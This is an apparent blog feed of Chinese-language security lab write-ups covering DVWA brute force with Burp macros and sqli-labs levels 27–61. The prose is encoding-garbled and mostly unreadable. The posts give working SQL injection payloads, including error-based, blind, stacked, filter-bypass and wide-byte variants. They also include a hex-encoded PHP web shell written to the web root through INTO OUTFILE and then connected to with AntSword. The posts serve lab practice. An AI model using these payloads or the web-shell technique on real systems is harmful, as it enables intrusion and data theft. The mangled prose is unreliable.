·æœ‰tokenå€¼ï¼Œä½†æ˜¯ä¸¤ä¸ªçº§åˆ«æœ€å¤–å±‚çš„çˆ†ç ´åœ¨é€šè¿‡å­—å…¸å°è¯•ä¸åŒå£ä»¤çš„æ—¶å€™ï¼Œhighåªè¦å‘POSTè¯·æ±‚æŠ¥æ–‡ï¼Œå°±èƒ½ä»å¯¹åº”çš„å“åº”æŠ¥æ–‡æ‹¿åˆ°ä¸‹æ¬¡å†å‘POSTè¯·æ±‚æŠ¥æ–‡æ—¶éœ€è¦ç”¨åˆ°çš„user_tokenã€‚**ä½†impossibleåªæœ‰å…ˆå‘é€GETæ–¹å¼çš„è¯·æ±‚æŠ¥æ–‡ï¼Œæ‰èƒ½è·å–åˆ°æœåŠ¡å™¨å‘å›æ¥çš„ä¸€æ¬¡æ€§user_tokenã€‚**è€ŒGETæ–¹å¼çš„è¯·æ±‚æŠ¥æ–‡ï¼Œæ— æ³•æäº¤çˆ†ç ´å‚æ•°ï¼Œåªèƒ½é€šè¿‡POSTæ–¹å¼çš„è¯·æ±‚æŠ¥æ–‡æ¥æäº¤çˆ†ç ´æ‰€ç”¨åˆ°çš„å‚æ•°ï¼Œæ‰€ä»¥éœ€è¦åœ¨BurpSuiteé‡Œå»ºç«‹ä¸€ä¸ªå®æ¥åå¤è¿›è¡Œæ“ä½œã€‚</p><h4 id="å»ºç«‹å®"><a class="header-anchor" href="#å»ºç«‹å®">ğŸ­</a>å»ºç«‹å®</h4><p>ç›´æ¥å¯¹dvwaé¶æœºçš„ç™»å½•ç•Œé¢è¿›è¡Œç ´è§£ï¼Œåœ¨project optionsçš„sessionsä¸­æ·»åŠ Macrosã€‚</p><p>é€‰æ‹©ç™»å½•é¡µé¢</p><p><img src="/2020/12/26/dvwa%E4%BA%8C/19.jpg" alt="19"></p><p>é€‰æ‹©tokenåå®šä¹‰å‚æ•°</p><p><img src="/2020/12/26/dvwa%E4%BA%8C/20.jpg" alt="20"></p><p>åœ¨configure itemä¸­æ·»åŠ </p><img src="/2020/12/26/dvwa%E4%BA%8C/21.jpg" alt="21" style="zoom:67%;"><p>æ·»åŠ è§„åˆ™æ—¶æ³¨æ„æè¿°è§„åˆ™æ—¶è¦å°†å…¶å‚æ•°èŒƒå›´å®šä¹‰åˆ°æ‰€æœ‰ç½‘å€ï¼Œå…¨å±€å®å®šä¹‰å°±ç»“æŸäº†</p><p><img src="/2020/12/26/dvwa%E4%BA%8C/23.jpg" alt="23"></p><p>æ¥ä¸‹æ¥æŠŠæäº¤çš„ç™»å½•ä¿¡æ¯çš„åŒ…å‘é€åˆ°å…¥ä¾µæ¨¡å—<strong>æ­¤æ—¶è¦é€‰æ‹©postæ¨¡å¼</strong></p><p><img src="/2020/12/26/dvwa%E4%BA%8C/25.jpg" alt="25"></p><p>æ¥ä¸‹æ¥è·Ÿhighç­‰çº§ä¸€æ ·ä½†æ”»å‡»æ¨¡å¼è¦é€‰é»˜è®¤çš„ç‹™å‡»æ‰‹æ¨¡å¼</p><p><img src="/2020/12/26/dvwa%E4%BA%8C/24.jpg" alt="24"></p><p>çˆ†ç ´æˆåŠŸ~~</p><p>impossibleå’Œhighçº§åˆ«çš„çˆ†ç ´æ¶‰åŠåˆ°ç™»é™†è¿”å›é¡µé¢ä¸­äº§ç”Ÿçš„éšæœºå€¼user_tokenï¼Œåœ¨ç”¨æˆ·ç™»å½•æ—¶è¦å°†user_tokenä¸€èµ·æäº¤ã€‚ç”±äºuser_tokenå¯æäº¤æŠ¥æ–‡çš„æ–¹å¼ä¸åŒï¼Œhighå’Œimpossibleçº§åˆ«çš„çˆ†ç ´è¿‡ç¨‹ä¹Ÿä¸åŒã€‚</p><p>è‡³æ­¤dvwaçš„æš´åŠ›ç ´è§£å°±ç»“æŸäº†~~</p><p>å‚è€ƒæ–‡çŒ®ï¼š<a href="https://zhuanlan.zhihu.com/p/126639909">DVWAæ•™ç¨‹ä¹‹Brute Forceï¼ˆhighã€impossibleï¼‰</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>sqli-labs(ä¸ƒ)</title>
    <link href="/2020/12/17/sqli-labs%E4%B8%83/"/>
    <url>/2020/12/17/sqli-labs%E4%B8%83/</url>
    
    <content type="html"><![CDATA[<h1>Less-42</h1><p>åˆçœ‹é¡µé¢,è€ƒè™‘åˆ°äºŒæ¬¡æ³¨å…¥ï¼ŒæŸ¥çœ‹updateçš„æºç ï¼š</p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/1.jpg" alt="1"></p><p>æ•°æ®éœ€ç»å‡½æ•°å¤„ç†ï¼Œæ•…ä¸èƒ½è¿›è¡ŒäºŒæ¬¡æ³¨å…¥ï¼Œå†æŸ¥çœ‹loginçš„ä»£ç ï¼š</p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/2.jpg" alt="2"></p><p>å¯†ç æ— å‡½æ•°å¤„ç†ï¼Œåœ¨å¯†ç è¿›è¡Œæ³¨å…¥<code>a';create table hi like users#</code></p><p>æ³¨å…¥å‰ï¼š</p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/3.jpg" alt="3"></p><p>æ³¨å…¥å:</p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/4.jpg" alt="4"></p><h1>Less-46</h1><p>åœ¨ä¹‹å‰çš„MySQLé‡Œæœ‰ä»‹ç»æŸ¥è¯¢è¯­å¥ï¼š<code>select &lt;åˆ—å&gt; from &lt;è¡¨å&gt; [where &lt;æŸ¥è¯¢æ¡ä»¶è¡¨è¾¾è¯•&gt;] [order by &lt;æ’åºçš„åˆ—å&gt;[ascæˆ–desc]]</code>,è€Œ46å…³å°±ä¸æ­¤ç›¸å…³ã€‚å…ˆçœ‹æºç ï¼š</p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/5.jpg" alt="5"></p><p>å‘ç°è¿™å…³ä½¿ç”¨sortä»£æ›¿idï¼Œå¹¶ä¸”ä¸ºæ•°å­—å‹æ³¨å…¥ï¼Œè¯•æ”¹å˜sortçš„å€¼ï¼š</p><img src="/2020/12/17/sqli-labs%E4%B8%83/6.jpg" alt="6" style="zoom:50%;"><p>åœ¨åæ¥ä¸Šasc(å‡åº)æˆ–è€…desc(é™åº);</p><img src="/2020/12/17/sqli-labs%E4%B8%83/7.jpg" alt="7" style="zoom:50%;"><p>å‘ç°ä¿®æ”¹order by åé¢çš„å‚æ•°æ‰§è¡Œç»“æœä¸åŒï¼Œæ¨æµ‹æ³¨å…¥ç‚¹åœ¨<code>order by</code>åçš„å‚æ•°ä¸­ï¼ŒæŸ¥è¯¢å®˜æ–¹æ–‡ä»¶ï¼š<a href="https://dev.mysql.com/doc/refman/8.0/en/select.html">MySQL</a></p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/8.jpg" alt="8"></p><p>å¯åˆ©ç”¨order by åå‚æ•°è¿›è¡Œæ³¨å…¥ã€‚å¼€å§‹å°è¯•ï¼š</p><h4 id="æ³•ä¸€ï¼šæŠ¥é”™æ³¨å…¥"><a class="header-anchor" href="#æ³•ä¸€ï¼šæŠ¥é”™æ³¨å…¥">ğŸ­</a>æ³•ä¸€ï¼šæŠ¥é”™æ³¨å…¥</h4><p><code>?sort=1 and updatexml(1,concat(0x7e,database()),1)</code></p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/9.jpg" alt="9"></p><p>ä¹Ÿå¯ä»¥ç”¨floor():</p><p><code>?sort=(select count(*) from information_schema.schemata group by concat_ws('-',(select database()),floor(rand()*2)))</code></p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/12.jpg" alt="12"></p><p>ä¹Ÿå¯ä»¥ç”¨extractvalue():</p><p><code>and extractvalue(1,concat(0x7e,(select database()),0x7e))</code></p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/16.jpg" alt="16"></p><h4 id="æ³•äºŒï¼šæ—¶é—´ç›²æ³¨"><a class="header-anchor" href="#æ³•äºŒï¼šæ—¶é—´ç›²æ³¨">ğŸ­</a>æ³•äºŒï¼šæ—¶é—´ç›²æ³¨</h4><p><code>and if(left(database(),8)='security',sleep(5),1)--+</code></p><img src="/2020/12/17/sqli-labs%E4%B8%83/10.jpg" alt="10" style="zoom:50%;"><p>ä½†æ˜¯æˆ‘å‘ç°åœ¨é”™è¯¯çš„æƒ…å†µä¸‹ï¼Œä¼‘çœ æ—¶é—´è¶…è¿‡5ç§’ç½‘é¡µè¿˜ä¼šæŠ¥é”™ï¼Œåœ¨æ•°æ®åº“é‡Œæ“ä½œ:</p><img src="/2020/12/17/sqli-labs%E4%B8%83/11.jpg" alt="11" style="zoom:50%;"><p>å¥½åƒæŒºæ­£å¸¸çš„ï¼Œå¯æ˜¯åœ¨ç«ç‹é‡Œå°±æ˜¯å¾ˆè¯¡å¼‚ï¼Œæœ‰ä¸ªè¯´æ³•æ˜¯æ·»åŠ <code>sleep(N)</code>è¿™ä¸ªå‡½æ•°åï¼Œè¯­å¥çš„æ‰§è¡Œå…·ä½“ä¼šåœç•™å¤šé•¿æ—¶é—´å–å†³äº<strong>æ»¡è¶³æ¡ä»¶çš„è®°å½•æ•°</strong>ï¼ŒMySQL ä¼šå¯¹<strong>æ¯æ¡</strong>æ»¡è¶³æ¡ä»¶çš„è®°å½•åœç•™ N ç§’é’Ÿï¼Œå¯å¦‚æœå› ä¸ºè¿™ä¸ªçš„è¯ï¼Œåº”è¯¥æ˜¯å»¶æ—¶å¾ˆä¹…ï¼Œä¸è‡³äºç½‘é¡µæŠ¥é”™å•Šã€‚ã€‚ã€‚ã€‚ã€‚ã€‚</p><h4 id="æ³•ä¸‰ï¼šrand-å‡½æ•°"><a class="header-anchor" href="#æ³•ä¸‰ï¼šrand-å‡½æ•°">ğŸ­</a>æ³•ä¸‰ï¼šrand()å‡½æ•°</h4><p>æ ¼å¼ï¼š<code>?sort=rand(sql è¯­å¥)</code></p><p>rand(true):</p><img src="/2020/12/17/sqli-labs%E4%B8%83/13.jpg" alt="13" style="zoom:50%;"><p>rand(flase):</p><img src="/2020/12/17/sqli-labs%E4%B8%83/15.jpg" alt="15" style="zoom:50%;"><p><code>?sort=rand(left(database(),8)='security')</code>:</p><img src="/2020/12/17/sqli-labs%E4%B8%83/14.jpg" alt="14" style="zoom:50%;"><p>é¡µé¢å’Œtrueä¸€æ ·ï¼Œæ•…è¯¥è¯­å¥æ­£ç¡®ã€‚</p><h4 id="æ³•å››-ä¸€å¥è¯æœ¨é©¬"><a class="header-anchor" href="#æ³•å››-ä¸€å¥è¯æœ¨é©¬">ğŸ­</a>æ³•å››:ä¸€å¥è¯æœ¨é©¬</h4><p>å…ˆä»‹ç»ä¸€ä¸ªè¯­æ³•ï¼š</p><pre><code class="hljs livecodeserver"><span class="hljs-keyword">lines</span> terminated <span class="hljs-keyword">by</span> <span class="hljs-number">0</span>x*<span class="hljs-comment">*//æ¯è¡Œè¾“å‡ºä»¥0x**ç»“å°¾</span></code></pre><p>æ¥ä¸‹æ¥è¦å¯¼æ–‡ä»¶ï¼Œå¯èƒ½æœ‰äººä¼šé‡åˆ°ä¸€æ ·çš„é—®é¢˜ï¼Œæ‰§è¡Œå¯¼æ–‡ä»¶å‘½ä»¤åæŠ¥é”™ï¼šThe MySQL server is running with the --secure-file-priv option so it cannot executeï¼Œéœ€åˆ°MySQLå‘½ä»¤é‡ŒæŸ¥è¯¢ï¼š</p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/17.jpg" alt="17"></p><p>å€¼ä¸ºnull,è¡¨ç¤ºé™åˆ¶mysqld ä¸å…è®¸å¯¼å…¥å¯¼å‡ºï¼Œéœ€åˆ°MySQLé…ç½®æ–‡ä»¶é‡Œæ›´æ”¹<code>secure_file_priv =</code>ä¸ºç©ºç™½</p><p>å†æŸ¥è¯¢ï¼š</p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/18.jpg" alt="18"></p><p>å³å¯å¯¼å‡ºæ–‡ä»¶ã€‚</p><p><code>?sort=1 into outfile &quot;D:\\phpstudy_pro\\WWW\\sql\\less-46\\lll.php&quot; lines terminated by 0x3c3f706870206576616c28245f504f53545b22636d64225d293b3f3e --+</code>(<strong>0xä¸€å®šè¦è®°å¾—åŠ ï¼Œä¸€å¼€å§‹å¿˜è®°åŠ ä¸€ç›´æŠ¥é”™ã€‚ã€‚ã€‚</strong>)</p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/19.jpg" alt="19"></p><p>åœ¨ç›®å½•é‡Œå¯æ‰¾åˆ°å¦‚ä¸Šæ–‡ä»¶ï¼Œè¿æ¥åˆ°èšå‰‘ï¼š</p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/20.jpg" alt="20"></p><p>47å…³å•å¼•å·åŒ…è£¹å…¶ä½™ç›¸åŒï¼Œ48å…³é™¤äº†ä¸æŠ¥é”™å…¶ä½™ä¹Ÿä¸€æ ·ï¼Œ49å…³å•å¼•å·åŒ…è£¹æ— å›æ˜¾ã€‚</p><h1>Less-50</h1><p>æŸ¥æºç ï¼š</p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/21.jpg" alt="21"></p><p>ç”¨äº†mysqli_multi_query()å‡½æ•°ï¼šæ‰§è¡Œä¸€ä¸ªæˆ–å¤šä¸ªé’ˆå¯¹æ•°æ®åº“çš„æŸ¥è¯¢ã€‚æ•…å¯ç”¨å †å æ³¨å…¥ï¼š</p><p><code>?sort=1; create table hhh like users;</code></p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/22.jpg" alt="22"></p><p>ä¹‹å‰çš„æ–¹æ³•ä»é€‚ç”¨,ä¹Ÿå¯ä»¥å †å æ–¹æ³•æ„é€ ä¸€å¥è¯æœ¨é©¬ã€‚51å…³å•å¼•å·åŒ…è£¹å…¶ä½™ç›¸åŒã€‚52å…³æ²¡æœ‰å›æ˜¾ï¼Œå…¶ä½™ä¸50å…³ç›¸åŒï¼Œ53å…³å•å¼•å·åŒ…è£¹ä¹Ÿæ— å›æ˜¾ï¼Œå…¶ä½™ç›¸åŒã€‚</p><h1>Less-54</h1><p>æ¥ä¸‹æ¥æ˜¯è¿›é˜¶å­¦ä¹ ï¼Œè¿™ä¸€å…³ä¸»è¦è€ƒå¯Ÿå­—ç¬¦å‹æ³¨å…¥ï¼Œä½†æ˜¯åªèƒ½å°è¯•åæ¬¡ï¼Œè¿™é‡Œçš„è¡¨åå’Œå¯†ç ç­‰æ˜¯æ¯åæ¬¡å°è¯•åå°±å¼ºåˆ¶è¿›è¡Œæ›´æ¢ã€‚</p><p>ç›²çŒœå•å¼•å·æ³¨å…¥ï¼š</p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/23.jpg" alt="23"></p><p>æŸ¥å­—æ®µæ•°ï¼š</p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/24.jpg" alt="24"></p><p>çˆ†è¡¨:</p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/25.jpg" alt="25"></p><p>çˆ†åˆ—ï¼š<img src="/2020/12/17/sqli-labs%E4%B8%83/26.jpg" alt="26"></p><p>çˆ†å€¼:</p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/27.jpg" alt="27"></p><p>è¾“å…¥å¯†é’¥ï¼š</p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/28.jpg" alt="28"></p><h1>Less-55</h1><p>è¿™å…³æœ‰ç‚¹å¥‡è‘©æˆ‘è¯•äº†ä¸ƒæ¬¡æ‰è¯•å‡ºé—­åˆæ–¹å¼ï¼Œå±…ç„¶æ˜¯æ•°å­—å‹çš„å°æ‹¬å·åŒ…è£¹ï¼š</p><p><code>?id=1)--+</code></p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/29.jpg" alt="29"></p><p>çˆ†è¡¨ï¼š</p><p><code>?id=0) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='challenges'--+</code></p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/30.jpg" alt="30"></p><p>çˆ†åˆ—ï¼š</p><p><code>?id=0ï¼‰ union select 1,2,group_concat(column_name) from information_schema.columns where table_schema='challenges' and table_name='8dzw16d8m5'--+</code></p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/31.jpg" alt="31"></p><p>çˆ†å€¼ï¼š</p><p><code>?id=0) union select 1,2,group_concat(secret_97U6) from challenges.8dzw16d8m5--+</code><img src="/2020/12/17/sqli-labs%E4%B8%83/32.jpg" alt="32"></p><p>æˆåŠŸ~~:</p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/33.jpg" alt="33"></p><p>56å…³ä¸º<code>')</code>åŒ…è£¹ï¼Œ57ä¸ºåŒå¼•å·åŒ…è£¹ã€‚</p><h1>Less-58</h1><p>åœ¨ä¹‹å‰çš„å…³å¡ä¸­æŠ¥é”™éƒ½è¢«æ³¨é‡Šï¼ŒæŠ¥é”™æ³¨å…¥å°±ä¸èƒ½ä½¿ç”¨ï¼Œæ•…å‰é¢çš„æ“ä½œæ¬¡æ•°è¾ƒå¤šï¼Œè€Œæ­¤å…³åªæœ‰äº”æ¬¡ï¼ŒæŸ¥çœ‹æºä»£ç ï¼š</p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/34-1608353774465.jpg" alt="34"></p><p>æŠ¥é”™æ²¡æœ‰è¢«æ³¨é‡Šï¼Œæ•…ç”¨æŠ¥é”™æ³¨å…¥ã€‚</p><p>å•å¼•å·åŒ…è£¹ï¼š</p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/35.jpg" alt="35"></p><p>çˆ†è¡¨ï¼š</p><p><code>?id=1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='challenges') ),1)--+</code></p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/36.jpg" alt="36"></p><p>çˆ†åˆ—:</p><p><code>?id=1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where  table_name='933h2rr0c5' )),1)--+</code><img src="/2020/12/17/sqli-labs%E4%B8%83/37.jpg" alt="37"></p><p>çˆ†å€¼ï¼š</p><p><code>?id=1' and updatexml(1,concat(0x7e,(select group_concat(secret_GJ8R) from challenges.933h2rr0c5 )),1)--+</code><img src="/2020/12/17/sqli-labs%E4%B8%83/38.jpg" alt="38"></p><p>æˆåŠŸï¼š</p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/39.jpg" alt="39"></p><p>59æ•°å­—å‹æ³¨å…¥ï¼Œ60<code>&quot;)</code>åŒ…è£¹ï¼Œ61å…³å€¼å¾—æ³¨æ„çš„æ˜¯å®ƒæ˜¯<code>'))'</code>åŒ…è£¹çš„ï¼Œç¬¬ä¸€éæˆ‘è¯•äº†å››æ¬¡æ‰å‡ºæ¥ï¼Œè¿™ä¸ªæ•…äº‹å‘Šè¯‰æˆ‘ä»¬è¦æ‰“ç ´å‰é¢å…³å¡çš„å›ºæœ‰æ€ç»´ã€‚ã€‚ã€‚ã€‚ã€‚</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>sqli-labsï¼ˆå…­ï¼‰</title>
    <link href="/2020/12/14/sqli-labs%E5%85%AD/"/>
    <url>/2020/12/14/sqli-labs%E5%85%AD/</url>
    
    <content type="html"><![CDATA[<h1>Less-27</h1><p>æŸ¥çœ‹æºç ï¼š</p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/2.jpg" alt="2"></p><p>è¿™å…³é¢å¤–æ³¨é‡Šäº†union,select,å­—ç¬¦ã€‚</p><p>å•å¼•å·æŠ¥é”™ï¼Œæ³¨é‡Šæ‰å›æ˜¾æ­£å¸¸ï¼š</p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/1.jpg" alt="1"></p><h2 id="æ³•ä¸€ï¼šè”åˆæŸ¥è¯¢"><a class="header-anchor" href="#æ³•ä¸€ï¼šè”åˆæŸ¥è¯¢">ğŸ­</a>æ³•ä¸€ï¼šè”åˆæŸ¥è¯¢</h2><p>å°†unionå’Œselectæ”¹ä¸ºå¤§å°å†™æ··åˆå°±å¯ä»¥:</p><p><code>?id=0'%0aUnIoN%0aSeLeCt%0a1,database(),2%0a%26%26%0a'1'='1</code></p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/3.jpg" alt="3"></p><p>ä¸å†èµ˜è¿°</p><h2 id="æ³•äºŒï¼šæŠ¥é”™æ³¨å…¥"><a class="header-anchor" href="#æ³•äºŒï¼šæŠ¥é”™æ³¨å…¥">ğŸ­</a>æ³•äºŒï¼šæŠ¥é”™æ³¨å…¥</h2><p><code>?id=1'%a0||%a0updatexml(1,concat(0x7e,(database())),1) %a0||'1'='1</code><img src="/2020/12/14/sqli-labs%E5%85%AD/4.jpg" alt="4"></p><h2 id="æ³•ä¸‰ï¼šå¸ƒå°”æ³¨å…¥"><a class="header-anchor" href="#æ³•ä¸‰ï¼šå¸ƒå°”æ³¨å…¥">ğŸ­</a>æ³•ä¸‰ï¼šå¸ƒå°”æ³¨å…¥</h2><p><code>?id=1'%0a%26%26%0aleft((select database()),8)='security'%26%26'1'='1</code></p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/5.jpg" alt="5"></p><h1>Less-27a</h1><p>è¯•æ¢å‡ºåŒå¼•å·æ³¨å…¥ï¼š</p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/6.jpg" alt="6"></p><p>æŸ¥çœ‹æºç ï¼š</p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/7.jpg" alt="7"></p><p>æ³¨é‡ŠæŠ¥é”™ï¼Œä¸èƒ½ç”¨æŠ¥é”™æ³¨å…¥ï¼Œæ­¥éª¤ç±»ä¼¼ï¼Œä¸å†èµ˜è¿°ã€‚</p><h1>Less-28</h1><p>å•å¼•å·æŠ¥é”™ï¼Œå•å¼•å·åŠ æ‹¬å·ä¹ŸæŠ¥é”™,å°†å…¶åˆ†åˆ«æ³¨é‡Šï¼š</p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/9.jpg" alt="9"></p><p>å›æ˜¾æ­£å¸¸</p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/10.jpg" alt="10"></p><p>å›æ˜¾æ­£å¸¸ï¼Ÿï¼Ÿå°†å•å¼•å·é—­åˆçš„idæ¢æ‰ï¼š</p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/11.jpg" alt="11"></p><p>å‘ç°å›æ˜¾æ˜¯idä¸º1çš„ç”¨æˆ·ï¼Œæ•…åˆ¤æ–­ä¸º<code>')'</code>æ³¨å…¥ã€‚ä¹Ÿå¯ä»¥ç”¨<code>;%00</code>æ³¨é‡Šå¯é¿å…è¿™ä¸ªé—®é¢˜ã€‚</p><p>æŸ¥æºç ï¼š<img src="/2020/12/14/sqli-labs%E5%85%AD/8.jpg" alt="8"></p><p>å°‘äº† andå’Œ orçš„æ³¨é‡Šï¼Œè¿‡æ»¤äº†ç›¸è¿çš„<code>union</code>å’Œ<code>select</code>ï¼Œæ­£åˆ™è¡¨è¾¾å¼ä¸­\sè¡¨ç¤ºåŒ¹é…ä¸€ä¸ªç©ºæ ¼ï¼Œä¹Ÿèƒ½åŒ¹é…åŒ…æ‹¬tabé”®ç­‰ä»»æ„ç©ºç™½å­—ç¬¦å¦‚åˆ¶è¡¨ç¬¦ã€æ¢è¡Œç¬¦ã€ç©ºæ ¼ç­‰ï¼Œå› æ­¤%0aæ¢è¡Œç¬¦ä¹Ÿè¢«åŒ¹é…äº†ï¼Œåªèƒ½ä½¿ç”¨%a0æ¥ç»•è¿‡ï¼Œ<code>/i</code>åŒæ—¶åŒ¹é…å¤§å°å†™ï¼Œè¿‡æ»¤äº†<code>--</code>ã€<code>#</code>ä»¥åŠ<code>/**/</code>ï¼Œ  è¿‡æ»¤äº†ä¸¤æ¬¡ç©ºæ ¼ï¼Œè¿‡æ»¤äº†<code>/</code>æ²¡è¿‡æ»¤<code>\</code>ï¼Œå…¶ä½™æ­¥éª¤ç±»ä¼¼ï¼š</p><p><code>?id=0')%a0uniOn%a0sElEct%a01,database(),3%a0or%a0('1')=('1</code><img src="/2020/12/14/sqli-labs%E5%85%AD/12.jpg" alt="12"></p><p>ä¸å†èµ˜è¿°ã€‚</p><h1>Less-28a</h1><p>æŸ¥çœ‹æºç ï¼š</p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/13.jpg" alt="13"></p><p>å°‘äº†å¾ˆå¤šæ³¨é‡Š</p><p><code>?id=0') uniOn%a0sElEct 1,database(),3 or ('1')=('1</code><img src="/2020/12/14/sqli-labs%E5%85%AD/14.jpg" alt="14"></p><p>ä¸å†èµ˜è¿°</p><h1>Less-29</h1><p>æ­£å¸¸å¼€å§‹æ‰“ï¼Œå‘ç°å®ƒä¸ç¬¬1å…³ä¸€æ ·ï¼ŒæŸ¥äº†æ•™ç¨‹è¿™ä¸€æ¬¡29-32å…³åœ¨å…¶ä»–åœ°æ–¹ï¼ŒåŒæ—¶è¿˜éœ€è¦é…ç½®jspstudyç¯å¢ƒ,æ¨èæ•™ç¨‹ï¼š<a href="https://www.cnblogs.com/heiwa-0924/p/12369438.html">Less-29</a>,æ³¨æ„ï¼š<strong>jspstudyçš„ç«¯å£é—®é¢˜ï¼Œä¸ä¸PHPstudyå…±ç”¨80ï¼Œå¦åˆ™ä¼šå†²çª</strong>è®¾ç½®å¥½å˜é‡åå‡ºç°å¦‚ä¸‹é¡µé¢:</p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/15.jpg" alt="15"></p><p>è¡¥å……çŸ¥è¯†:</p><h2 id="æœåŠ¡å™¨ï¼ˆä¸¤å±‚ï¼‰æ¶æ„"><a class="header-anchor" href="#æœåŠ¡å™¨ï¼ˆä¸¤å±‚ï¼‰æ¶æ„">ğŸ­</a>æœåŠ¡å™¨ï¼ˆä¸¤å±‚ï¼‰æ¶æ„</h2><img src="/2020/12/14/sqli-labs%E5%85%AD/16.jpg" style="zoom: 67%;"><p>æœåŠ¡å™¨ç«¯æœ‰ä¸¤ä¸ªéƒ¨åˆ†ï¼šç¬¬ä¸€éƒ¨åˆ†ä¸ºtomcatä¸ºå¼•æ“çš„jspå‹æœåŠ¡å™¨ï¼Œç¬¬äºŒéƒ¨åˆ†ä¸ºapacheä¸ºå¼•æ“çš„phpæœåŠ¡å™¨ï¼ŒçœŸæ­£æä¾›webæœåŠ¡çš„æ˜¯phpæœåŠ¡å™¨ã€‚å·¥ä½œæµç¨‹å¦‚ä¸Šå›¾ï¼Œapacheè§£ææœ€åä¸€ä¸ªå‚æ•°ï¼ŒTomcatï¼ˆjspï¼‰è§£æç¬¬ä¸€ä¸ªå‚æ•°ã€‚tomcatæœåŠ¡å™¨å¤„åšæ•°æ®è¿‡æ»¤å’Œå¤„ç†ï¼ŒåŠŸèƒ½ç±»ä¼¼ä¸ºä¸€ä¸ªWAFã€‚å› ä¸ºè§£æå‚æ•°çš„ä¸åŒï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¯¥åŸç†ç»•è¿‡WAFçš„æ£€æµ‹ã€‚è¯¥ç”¨æ³•å°±æ˜¯httpå‚æ•°æ±¡æŸ“æ”»å‡»çš„ä¸€ä¸ªåº”ç”¨ã€‚HPPå¯å¯¹æœåŠ¡å™¨å’Œå®¢æˆ·ç«¯éƒ½èƒ½å¤Ÿé€ æˆä¸€å®šçš„å¨èƒã€‚æ¨èæ•™ç¨‹ï¼š<a href="https://www.cnblogs.com/lcamry/p/5762961.html">æœåŠ¡å™¨ä¸¤å±‚æ¶æ„</a></p><p>å•å¼•å·æŠ¥é”™ï¼š</p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/17.jpg" alt="17"></p><p>æ³¨é‡Šåå›æ˜¾æ­£å¸¸ï¼š</p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/18.jpg" alt="18"></p><p>ä¸å†èµ˜è¿°ã€‚</p><h1>Less-32</h1><p>ç™»å½•ï¼Œå‘ç°è½¬ä¹‰</p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/19.jpg" alt="19"></p><p>æŸ¥çœ‹æºç :</p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/21.jpg" alt="21"></p><p>æ­¤å…³ä¸ºå®½å­—èŠ‚æ³¨å…¥ï¼Œåœ¨ä¹‹å‰æ–‡ç« SQLåŸºç¡€é‡Œæœ‰ä»‹ç»ï¼Œæ¨èè§£ç ç½‘ç«™ï¼š<a href="http://www.mytju.com/classcode/tools/urldecode_gb2312.asp">GBKè§£ç </a>ï¼Œ</p><h4 id="æ³•ä¸€"><a class="header-anchor" href="#æ³•ä¸€">ğŸ­</a>æ³•ä¸€</h4><p>æ·»åŠ %df,æ„é€ å®½å­—èŠ‚æ³¨å…¥æ¼æ´ï¼š</p><img src="/2020/12/14/sqli-labs%E5%85%AD/20.jpg" alt="20" style="zoom: 33%;"><h4 id="æ³•äºŒ"><a class="header-anchor" href="#æ³•äºŒ">ğŸ­</a>æ³•äºŒ</h4><p>%5cè¡¨ç¤º\ ï¼Œå¦‚æœèƒ½å°†è¿”å›çš„ç»“æœä¸­å¯¹äºå•å¼•å·æ²¡æœ‰è½¬ä¹‰å­—ç¬¦è¿›è¡Œå¤„ç†ï¼Œå¦‚ç”¨å­—æ¯ç»„åˆä½¿å…¶å½¢æˆå®½å­—èŠ‚ï¼Œä»è€Œä½¿\ï¼ˆæ–œæ ï¼‰å¤±æ•ˆï¼Œä¹Ÿå¯è¾¾åˆ°å®½å­—èŠ‚æ¼æ´ï¼Œä¾‹å¦‚ç”¨%câ€™cccå’Œ%5cè¿›è¡Œç»„åˆï¼Œè¿™é‡Œhhå¯éšæ„ã€‚</p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/22.jpg" alt="22"></p><p>æ•ˆæœå¦‚ä¸‹:</p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/23.jpg" 